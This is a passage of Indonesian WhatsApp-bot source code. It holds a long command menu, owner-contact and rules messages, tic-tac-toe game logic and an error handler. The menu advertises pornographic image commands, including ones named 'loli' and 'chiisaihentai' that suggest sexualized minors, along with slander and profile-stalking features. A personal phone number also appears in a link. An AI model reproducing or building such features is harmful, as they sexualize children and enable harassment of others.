├ ${prefix}kalkulator [ _angka_ ]
├ ${prefix}fancytext [ _teks_ ]
├ ${prefix}githubstalk [ _username_ ]
├ ${prefix}translate [ _teks kodebhs_ ]
└ ${prefix}ss [ _link_ ]
├  ${prefix}groupsetting
├  ${prefix}antilink
├  ${prefix}antibitly
├  ${prefix}antivirtex
├  ${prefix}antihidetag
├  ${prefix}group
├  ${prefix}opentime
├  ${prefix}closetime
├  ${prefix}afk *ALASAN*
├  ${prefix}ceksewa
├  ${prefix}kickall
├  ${prefix}infogrup
├  ${prefix}promote
├  ${prefix}demote
├  ${prefix}listonline
├  ${prefix}tagall *TEKS*
├  ${prefix}leave
├  ${prefix}kick *REPLY*
├  ${prefix}add *62xxxx*
├  ${prefix}setgrupname
├  ${prefix}setppgrup
├  ${prefix}setdesc
├  ${prefix}sider *REPLY*
├  ${prefix}hidetag *REPLY/TEKS*
├  ${prefix}fitnah
├ ${prefix}blackpink text
├ ${prefix}neon text
├ ${prefix}greenneon text
├ ${prefix}advanceglow text
├ ${prefix}futureneon text
├ ${prefix}sandwriting text
├ ${prefix}sandsummer text
├ ${prefix}sandengraved text
├ ${prefix}metaldark text
├ ${prefix}neonlight text
├ ${prefix}holographic text
├ ${prefix}text1917 text
├ ${prefix}minion text
├ ${prefix}deluxesilver text
├ ${prefix}newyearcard text
├ ${prefix}bloodfrosted text
├ ${prefix}halloween text
├ ${prefix}jokerlogo text
├ ${prefix}fireworksparkle text
├ ${prefix}natureleaves text
├ ${prefix}bokeh text
├ ${prefix}toxic text
├ ${prefix}strawberry text
├ ${prefix}box3d text
├ ${prefix}roadwarning text
├ ${prefix}breakwall text
├ ${prefix}icecold text
├ ${prefix}luxury text
├ ${prefix}cloud text
├ ${prefix}summersand text
├ ${prefix}horrorblood text
├ ${prefix}thunder text
├ ${prefix}pornhub text1 text2
├ ${prefix}glitch text1 text2
├ ${prefix}avenger text1 text2
├ ${prefix}space text1 text2
├ ${prefix}ninjalogo text1 text2
├ ${prefix}marvelstudio text1 text2
├ ${prefix}lionlogo text1 text2
├ ${prefix}wolflogo text1 text2
├ ${prefix}steel3d text1 text2
├ ${prefix}wallgravity text1 text2
├ ${prefix}chiisaihentai
├ ${prefix}trap
├ ${prefix}blowjob
├ ${prefix}yaoi
├ ${prefix}ecchi
├ ${prefix}hentai
├ ${prefix}ahegao
├ ${prefix}hololewd
├ ${prefix}sideoppai
├ ${prefix}animefeets
├ ${prefix}animebooty
├ ${prefix}animethighss
├ ${prefix}hentaiparadise
├ ${prefix}animearmpits
├ ${prefix}hentaifemdom
├ ${prefix}lewdanimegirls
├ ${prefix}biganimetiddies
├ ${prefix}animebellybutton
├ ${prefix}hentai4everyone
├ ${prefix}bj
├ ${prefix}ero
├ ${prefix}ppcp
├ ${prefix}cum
├ ${prefix}feet
├ ${prefix}yuri
├ ${prefix}trap
├ ${prefix}lewd
├ ${prefix}feed
├ ${prefix}eron
├ ${prefix}solo
├ ${prefix}gasm
├ ${prefix}poke
├ ${prefix}anal
├ ${prefix}holo
├ ${prefix}tits
├ ${prefix}kuni
├ ${prefix}kiss
├ ${prefix}erok
├ ${prefix}smug
├ ${prefix}baka
├ ${prefix}solog
├ ${prefix}feetg
├ ${prefix}lewdk
├ ${prefix}waifu
├ ${prefix}pussy
├ ${prefix}femdom
├ ${prefix}cuddle
├ ${prefix}hentai
├ ${prefix}eroyuri
├ ${prefix}cum_jpg
├ ${prefix}blowjob
├ ${prefix}erofeet
├ ${prefix}holoero
├ ${prefix}classic
├ ${prefix}erokemo
├ ${prefix}fox_girl
├ ${prefix}futanari
├ ${prefix}lewdkemo
├ ${prefix}wallpaper
├ ${prefix}pussy_jpg
├ ${prefix}kemonomimi
├ ${prefix}nsfw_avatar
├ ${prefix}ngif
├ ${prefix}nsfw_neko_gif
├ ${prefix}random_hentai_gif
├ ${prefix}shadow text
├ ${prefix}cup text
├ ${prefix}cup1 text
├ ${prefix}romance text
├ ${prefix}smoke text
├ ${prefix}burnpaper text
├ ${prefix}lovemessage text
├ ${prefix}undergrass text
├ ${prefix}love text
├ ${prefix}coffe text
├ ${prefix}woodheart text
├ ${prefix}woodenboard text
├ ${prefix}summer3d text
├ ${prefix}wolfmetal text
├ ${prefix}nature3d text
├ ${prefix}underwater text
├ ${prefix}golderrose text
├ ${prefix}summernature text
├ ${prefix}letterleaves text
├ ${prefix}glowingneon text
├ ${prefix}fallleaves text
├ ${prefix}flamming text
├ ${prefix}harrypotter text
├ ${prefix}carvedwood text
├ ${prefix}tiktok text1 text2
├ ${prefix}arcade8bit text1 text2
├ ${prefix}battlefield4 text1 text2
├ ${prefix}pubg text1 text2
├ ${prefix}wetglass text
├ ${prefix}multicolor3d text
├ ${prefix}watercolor text
├ ${prefix}luxurygold text
├ ${prefix}galaxywallpaper text
├ ${prefix}lighttext text
├ ${prefix}beautifulflower text
├ ${prefix}puppycute text
├ ${prefix}royaltext text
├ ${prefix}heartshaped text
├ ${prefix}birthdaycake text
├ ${prefix}galaxystyle text
├ ${prefix}hologram3d text
├ ${prefix}greenneon text
├ ${prefix}glossychrome text
├ ${prefix}greenbush text
├ ${prefix}metallogo text
├ ${prefix}noeltext text
├ ${prefix}glittergold text
├ ${prefix}textcake text
├ ${prefix}starsnight text
├ ${prefix}wooden3d text
├ ${prefix}textbyname text
├ ${prefix}writegalacy text
├ ${prefix}galaxybat text
├ ${prefix}snow3d text
├ ${prefix}birthdayday text
├ ${prefix}goldplaybutton text
├ ${prefix}silverplaybutton text
├ ${prefix}freefire text
├ ${prefix}darkjoke
├ ${prefix}meme
├ ${prefix}joke
├ ${prefix}wasted
├ ${prefix}hitler
├ ${prefix}wanted
├ ${prefix}greyscale
├ ${prefix}trash
├ ${prefix}circle
├ ${prefix}blur
├ ${prefix}tinyurl
├ ${prefix}cuttly
├ ${prefix}affect
├ ${prefix}picture
├ ${prefix}artinama *nama kamu*
├ ${prefix}artimimpi
├ ${prefix}jodoh
├ ${prefix}tebakumur *nama kamu*
├ ${prefix}tebakgender *nama kamu*
├ ${prefix}drakorongoing
├ ${prefix}lk21 query
├ ${prefix}wattpad url_wattpad
├ ${prefix}wattpadsearch query
├ ${prefix}cerpen
├ ${prefix}ceritahoror
├ ${prefix}quotes
├ ${prefix}quotesdilan
├ ${prefix}quotesanime
├ ${prefix}quotesimage
├ ${prefix}faktaunik
├ ${prefix}katabijak
├ ${prefix}pantun
├ ${prefix}bucin
├ ${prefix}randomnama
├ ${prefix}darkjokes
├ ${prefix}memeindo
├ ${prefix}katailham
├ ${prefix}katajago
├ ${prefix}cekbapak
├  ${prefix}antidelete
├  ${prefix}anticall
├  ${prefix}antivo
├  ${prefix}bc *teks*
├  ${prefix}term
├  ${prefix}eval
├  ${prefix}reset
├  ${prefix}clearall
├  ${prefix}leaveall
├  ${prefix}upswteks
├  ${prefix}upswimage
├  ${prefix}upswsticker
├  ${prefix}upswgif
├  ${prefix}upswaudio
├  ${prefix}upswvoice
├  ${prefix}upswvideo
├  ${prefix}leaveall
├  ${prefix}join *link gc*
├  ${prefix}shutdown
├  ${prefix}getquoted
├  ${prefix}addupdate *fiturnya*
├  ${prefix}exif *nama|author*
├  ${prefix}sewa add/del *waktunya*
├  ${prefix}premium add @tag|nomor
├  ${prefix}premium del @tag|nomor
├  ${prefix}hacked *TEKSNYA*
├  ${prefix}boomtext *TEKSNYA*
├  ${prefix}loli
├  ${prefix}manga
├  ${prefix}anime 
├  ${prefix}lolivideo
├  ${prefix}husbu
├  ${prefix}waifu
├  ${prefix}milf
├  ${prefix}neko
├  ${prefix}kanna
├  ${prefix}sagiri
├  ${prefix}hentai
├  ${prefix}cosplay
├  ${prefix}wallnime
├  ${prefix}kusonime
├  ${prefix}megumin
├  ${prefix}otakudesu
├  ${prefix}otaku
├  ${prefix}doujindesu
├  ${prefix}storyanime
├  ${prefix}nakanomiku
├  ${prefix}nakanoikyy
├  ${prefix}nakanoitsuki
├  ${prefix}otakuongoing
├  ${prefix}nhentai *code*
├  ${prefix}nekopoi *link*
├  ${prefix}nekopoi3d
├  ${prefix}nekopoicosplay
├  ${prefix}nekopoisearch
├  ${prefix}fb 
├  ${prefix}igdl 
├  ${prefix}igdl2 
├  ${prefix}twitter 
├  ${prefix}tiktok 
├  ${prefix}play 
├  ${prefix}ythd 
├  ${prefix}ytmp3 
├  ${prefix}ytmp4 
├  ${prefix}soundcloud 
├  ${prefix}tiktoknowm 
├  ${prefix}tiktokaudio
├  ${prefix}mediafire 
├  ${prefix}nhentaipdf *code*
├  ${prefix}brainly *query*
├  ${prefix}shopee *product*
├  ${prefix}playstore *query*
├  ${prefix}ssweb *query*
├  ${prefix}google *query*
├  ${prefix}image *query*
├  ${prefix}pinterest *query*
├  ${prefix}nulis *teks*
├  ${prefix}nulis *teks*
├  ${prefix}iguser *ussername*
├  ${prefix}igstalk *username*
├  ${prefix}githubstalk *username*
├  ${prefix}tiktokstalk *ussername*
├  ${prefix}img2url *reply foto*
├  ${prefix}ytsearch *query*
├  ${prefix}slot
├  ${prefix}limitgame
├  ${prefix}gelud @tag
├  ${prefix}tictactoe @tag
├  ${prefix}siapaaku
├  ${prefix}family100
├  ${prefix}kuismath
├  ${prefix}asahotak
├  ${prefix}tebaklirik
├  ${prefix}tebaklagu
├  ${prefix}tebakkata
├  ${prefix}susunkata
├  ${prefix}kimiakuis
├  ${prefix}caklontong
├  ${prefix}tebakjenaka
├  ${prefix}tebakanime
├  ${prefix}tebaktebakan
├  ${prefix}tebakgambar
├  ${prefix}tebakbendera
├  ${prefix}suit *batu/kertas/gunting*
├  ${prefix}suit2
├  ${prefix}dadu
├  ${prefix}amongus *TEKS*
├  ${prefix}doge
├  ${prefix}toimg
├  ${prefix}patrick
├  ${prefix}garwgura
├  ${prefix}ttg *teks*
├  ${prefix}ttp *teks
├  ${prefix}ttp2 *teks*
├  ${prefix}ttp3 *teks*
├  ${prefix}ttp4 *teks*
├  ${prefix}attp *teks*
├  ${prefix}stickeranime
├  ${prefix}semoji *emoji*
├  ${prefix}sticker *reply foto/video*
├  ${prefix}smeme *teks|teks*
├  ${prefix}swm *pack|author*
├  ${prefix}take *pack|author* 
├  ${prefix}tovideo *reply sgif*

 *FUN MENU*
├  ${prefix}mining
├  ${prefix}togel
├  ${prefix}cekwatak
├  ${prefix}cekmati [nama]
├  ${prefix}wangy [nama]
├  ${prefix}citacita
├  ${prefix}toxic
├  ${prefix}tod
├  ${prefix}truth
├  ${prefix}dare
├  ${prefix}apakah
├  ${prefix}bisakah
├  ${prefix}kapankah
├  ${prefix}rate
├  ${prefix}jadian
├  ${prefix}cantik
├  ${prefix}ganteng
├  ${prefix}beban
├  ${prefix}babi
├  ${prefix}ngentot
├  ${prefix}gantengcek
├  ${prefix}cantikcek
├  ${prefix}goblokcek
├  ${prefix}gaycek
├  ${prefix}sangecek
├  ${prefix}cekbapack
├  ${prefix}hbd
├  ${prefix}hilih *teks*
├  ${prefix}alay
├  ${prefix}hbk
├  ${prefix}bpurba
├  ${prefix}infocorona
├  ${prefix}cekkalender
├  ${prefix}cekramadhan
├  ${prefix}update
├  ${prefix}level
├  ${prefix}rules
├  ${prefix}profile
├  ${prefix}waktu
├  ${prefix}botstat
├  ${prefix}sewabot
├  ${prefix}listsewa
├  ${prefix}owner
├  ${prefix}ping
├  ${prefix}runtime
├  ${prefix}donasi
├  ${prefix}leaderboard
├  ${prefix}cekpremium
├  ${prefix}listpremium
├  ${prefix}sourcecode
├  ${prefix}bugreport *keluhan*
├  ${prefix}listsurah
├  ${prefix}alquran
├  ${prefix}alquranaudio
├  ${prefix}asmaulhusna
├  ${prefix}kisahnabi
├  ${prefix}jadwalsholat
├  ${prefix}ayatkursi
├  ${prefix}bacaanshalat
├  ${prefix}doaharian
├  ${prefix}slow
├  ${prefix}tupai
├  ${prefix}bass
├  ${prefix}robot
├  ${prefix}balik
├  ${prefix}gemuk
├  ${prefix}fast
├  ${prefix}imut
├  ${prefix}hode
├  ${prefix}nightcore
├  ${prefix}tts *KODE BAHASA*
├  ${prefix}addvn
├  ${prefix}getvn
├  ${prefix}listvn
├  ${prefix}addsticker
├  ${prefix}getsticker
├  ${prefix}liststicker
├  ${prefix}addimage
├  ${prefix}getimage
├  ${prefix}listimage
├  ${prefix}addvideo
├  ${prefix}getvideo
├  ${prefix}listvideo
├  ${prefix}addcmd
├  ${prefix}delcmd
├  ${prefix}listcmd
`
katalog(menu)
}
if (wannofc == "ownerku"){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 
			         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = wann.contacts[i] != undefined ? wann.contacts[i].vname || wann.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${wann.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await wann.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'rulesbot', buttonText:{displayText: 'rules'}, type: 1},
{buttonId: 'allmenuku', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}` ,
buttons: buttonss,
headerType: 1
}
wann.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
} 
if (wannofc == "rulesbot"){
rules =`*── 「 RULES AND FAQ 」 ──*

1. Jangan spam bot. 🙅
Sanksi: *⚠️ WARN/SOFT BLOCK*

2. Jangan telepon bot. ☎️
Sanksi: *❎ SOFT BLOCK*

3. Jangan mengeksploitasi bot.😖
Sanksi: *‼️ PERMANENT BLOCK ‼️*

🗯️ Bot tidak atau lambat merespon ?
➡️ Mungkin dipengaruhi oleh jaringan, signal, banned oleh Whatsapp dan beberapa asalan. Tetap patuhi rules‼️

🗯️ Dimana saya bisa mendapatkan Script dari bot ini ?
➡️ Script ini masih private dan tidak pernah diperjual belikan ,bijaklah dalam mengetahui penipu.

🗯️ Prefixnya apa ya?
➡️ Bot ini menggunakan multi prefix. Berarti anda bisa menggunakan prefix #, . , Dan prefix wajar lainnya.

🗯️ Kak, kok syaa chat owner tidak direspon?
➡️ Owner hanya merespon pertanyaan seputar bot Dan kendala eror, tidak untuk kenalan ataupun mengemis script.


Jika sudah dipahami rules-nya, silakan ketik *${prefix}allmenu* untuk memulai!

⚠️ Segala kebijakan dan ketentuan Invibot di pegang oleh owner dan segala perubahan kebijakan, sewaktu waktu owner berhak mencabut, memblokir user(*﹏*) 

Arigatou Gozaimasu! Untuk kalian user ramah dan Beberapa orang yg ikut membantu juga dalam project pembuatan Alphabot
😖🙏
    `
grupinv(menu)
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*?? Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh *@${tty.player2.split('@')[0]}*\n`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
wann.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Giliran = @${tty.player1.split('@')[0]}`
 wann.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('|ERR|', 'red'), color(e, 'cyan'))
     wann.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./wann.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
	}
    }
    }
    }
    }
    }
    }
    
